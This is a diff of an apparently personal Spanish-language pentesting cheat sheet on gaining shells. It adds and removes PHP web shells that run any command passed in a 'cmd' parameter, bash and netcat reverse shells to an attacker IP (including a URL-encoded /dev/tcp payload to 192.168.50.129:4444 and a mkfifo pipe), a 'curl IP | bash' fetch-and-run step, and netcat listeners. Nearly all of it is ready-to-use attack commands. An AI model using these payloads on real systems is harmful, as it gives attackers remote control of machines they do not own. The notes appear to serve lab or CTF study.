@@ -165,28 +165,6 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 'Connect-Back"')
 ```
 
-## Webshell/ReverseShell en Kali
-
-```bash 
-❯ ls -al /usr/share/webshells/               # En esa ruta tenemos diferetes Revershell o Webshells
-```
-
-## Netcat
-
-```bash 
-# Netcat nos ayuda a poder hacer 'Banner grabbing, Port scanning, Transferring files, Bind/Reverse shells', puede ser utilizado como 'Modo cliente, Modo servidor'
-
-❯ nc -nv <IP> <port>        # Hacer que Netcat se conecte a un puerto especifico de una IP por TCP
-❯ nc -nvu <IP> <port>       # Hacer que Netcat se conecte a un puerto especifico de una IP por UDP
-	# n = No DNS
-	# u = UDP 
-	# v = Verbose
-
-
-❯ nc -nc <IP> <Port> < file.txt        # Esta es la forma de enviar un archivo (Maquina atacante 'Envia')
-❯ nc -nlvp 443 > file.txt              # El archivo que reciba lo colocara en file.txt (Maquina victima 'Recibe')
-```
-
 ## RCE MySQL
 
 ```bash 
@@ -196,34 +174,6 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 
 # Ahora en la URL podemos ejecutar comandos 
 ❯ shell.php?cmd=whoami            
-```
-
-## Reverse / Bind Shells directamente
-
-```bash 
-# Desde la URL de la Web (Maquina victima)
-
-❯ nc -nlvp 443   # Ponernos en escucha con Netcat (Maquina atacante) Linux     
-
-# Para la Revershell en la URL de la web (Maquina victima)
-❯ nc -e /bin/bash IP 443
-❯ bash -i >& /dev/tcp/IP/443 0>&1
-	# Ip = Ip del atacante 
-
-❯ bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"
-# Donde debemos de urlencodear el '&'
-	& = %26
-```
-
-```bash 
-# Desde la terminal del SO
-❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe     # nc.exe nos ayuda a conseguir una ReverShell en Windows (Ruta en Linux)
-
-❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
-❯ nc.exe -nv <IP> 443 -e cmd.exe                   # Completar la Reverse shell desde una maquina victima Windows
-
-❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
-❯ nc -nv <IP> 443 -e /bin/bash                     # Completar la Reverse shell desde una maquina victima Linux
 ```
 
 ## Bind Shell:
@@ -301,6 +251,8 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 		echo "<pre>$output</pre>";
 	?>
 
+# Colocare la revershell en la web 
+❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
 ```
 
 ## Index.html
@@ -315,7 +267,7 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 	# 443 = Puerto a usar
 
 
-❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
+❯ curl ❮IP❯ | bash    # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
 ```
 
 ## Imagen 'png' 
@@ -326,6 +278,9 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 	<?php
 		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 	?>
+
+# Colocare la revershell en la web 
+❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
 ```
 
 ## ReverShell en php:
@@ -337,22 +292,32 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 
 	# IP = IP de atacante
 	# 443 = Puerto a usar
+
+<?php
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+
+# Colocare la revershell en la web 
+❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
 ```
+
+## Escucha Netcat 
 
 ```bash
 # Escucha por Netcat en espera de la Revershell
 
-❯ nc -nlvp 443            # Linux
+❯ nc -nlvp 443            # Para obtener un shell en Linux
 
-❯ rlwrap nc -nlvp 443     # Windows 
+❯ rlwrap nc -nlvp 443     # Para obtener un shell en Windows 
 
 	# nc = Netcat 
 	# n = No DNS
 	# l = Modo escucha, conexiones entrantes
 	# v = verbose
 	# p = numero local de puerto en esucha
-
 ```
+
+## Otras Revershell 
 
 ```bash 
 ❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 443 >/tmp/f          # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima 
@@ -361,6 +326,8 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 # Nos debemos de poner en escucha antes de esta manera
 ❯ nc -nlvp 443                   # Escucha en la maquina de atacante
 ```
+
+## Pwncat 
 
 ```bash 
 ❯ pwncat-cs -lp 443                         # Podemos usar esta herramienta llamada 'Pwncat'
@@ -378,7 +345,6 @@ Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/va
 	<?php 
 		echo shell_exec($_GET['cmd']);
 	?>
-
 ```
 Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
 Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahí pode colocar comandos y conectarnos a nuestra maquina de **Atacante** por una **ForwardShell**
